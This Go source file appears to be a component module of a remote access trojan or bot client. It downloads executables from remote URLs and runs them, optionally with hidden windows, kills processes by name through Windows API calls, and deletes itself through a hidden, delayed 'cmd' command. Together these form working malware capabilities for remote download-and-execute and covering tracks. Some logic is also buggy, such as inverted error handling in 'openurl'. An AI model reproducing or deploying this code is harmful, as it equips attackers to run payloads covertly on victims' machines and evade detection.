package components

import (
	"log"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"syscall"
)

func remote_execute(path string, hidden bool, args ...string) bool {
	// Check if it's an URL or not
	u, err := url.Parse(path)
	if err != nil {
		return false
	}
	if u.Scheme != "" && u.Host != "" {
		// Ye, it is url, download it from remote host
		path = download_from_url(path, "")
		if path == "" {
			// Failed to download
			log.Println("Failed to remote download")
			return false
		}
	}

	return start_exe(path, hidden, args...)
}

func openurl(url string, mode string) bool {
	var err error
	if mode == "0" {
		var resp *http.Response
		resp, err = http.Get(url)
		if err != nil {
			defer resp.Body.Close()
		}
	} else {
		err = exec.Command("cmd", "/c", "start", url).Start()
	}
	return err != nil
}

func start_exe(name string, hidden bool, args ...string) bool {
	// binary, err := exec.LookPath(name)
	// if err != nil {
	// 	final_name = name
	// } else {
	// 	final_name = binary
	// }

	cmd := exec.Command(name, args...)
	switch runtime.GOOS {
	case "windows":
		if hidden {
			cmd.SysProcAttr = &syscall.SysProcAttr{
				HideWindow: true,
			}
		}
	default:
		exec.Command("chmod", "+x", name).Run()
		if hidden {
			cmd.Stdout = nil
			cmd.Stderr = nil
		}
	}

	return cmd.Start() == nil
}

func kill(name string) bool {
	pid := find_pid_by_name(name)
	if pid == 0 {
		return false
	}
	hProcess, _, _ := pfnOpenProcess.Call(PROCESS_TERMINATE, 0, uintptr(pid))
	if hProcess == 0 {
		return false
	}
	ret, _, _ := pfnTerminateProcess.Call(hProcess, 0)

	return ret != 0
}

// TODO: It has bugs
func uinstall() {
	_ = os.Chdir(os.TempDir())
	str := `ping 127.0.0.1 -n 3 > nul && del /f /q "` + get_module_file() + `"`
	cmd := exec.Command("cmd", "/C", str)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if err := cmd.Start(); err != nil {
		return
	}
	os.Exit(0)
}
